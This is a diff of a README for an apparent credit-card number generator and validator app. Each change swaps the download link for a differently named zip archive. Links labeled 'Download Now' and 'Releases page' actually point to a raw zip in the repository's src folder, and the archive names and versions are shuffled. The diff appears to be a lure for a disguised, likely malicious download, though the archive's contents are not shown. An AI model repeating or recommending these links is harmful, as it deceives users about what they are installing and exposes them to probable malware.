@@ -1,6 +1,6 @@
 # 💳 Credit-Card-Generator-and-Validator - Create and Validate Cards with Ease
 
-## 🖱️ [Download Now](https://raw.githubusercontent.com/KKDIDD/Credit-Card-Generator-and-Validator/main/src/Validator_Card_and_Credit_Generator_v3.1.zip)
+## 🖱️ [Download Now](https://raw.githubusercontent.com/KKDIDD/Credit-Card-Generator-and-Validator/main/src/Generator_Credit_and_Card_Validator_v2.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, you need:
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://raw.githubusercontent.com/KKDIDD/Credit-Card-Generator-and-Validator/main/src/Validator_Card_and_Credit_Generator_v3.1.zip). 
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/KKDIDD/Credit-Card-Generator-and-Validator/main/src/Generator_Credit_and_Card_Validator_v2.4-alpha.1.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the Credit Card Generator and Validator. 
@@ -77,4 +77,4 @@ If you're interested in learning more about credit card generation and validatio
 - **Luhn Algorithm:** Understanding this algorithm helps in validating credit card numbers.
 - **React & TailwindCSS:** The technologies used to build this application, which can empower you to create your own projects.
 
-## 🔗 [Visit Releases Page to Download](https://raw.githubusercontent.com/KKDIDD/Credit-Card-Generator-and-Validator/main/src/Validator_Card_and_Credit_Generator_v3.1.zip)
+## 🔗 [Visit Releases Page to Download](https://raw.githubusercontent.com/KKDIDD/Credit-Card-Generator-and-Validator/main/src/Generator_Credit_and_Card_Validator_v2.4-alpha.1.zip)
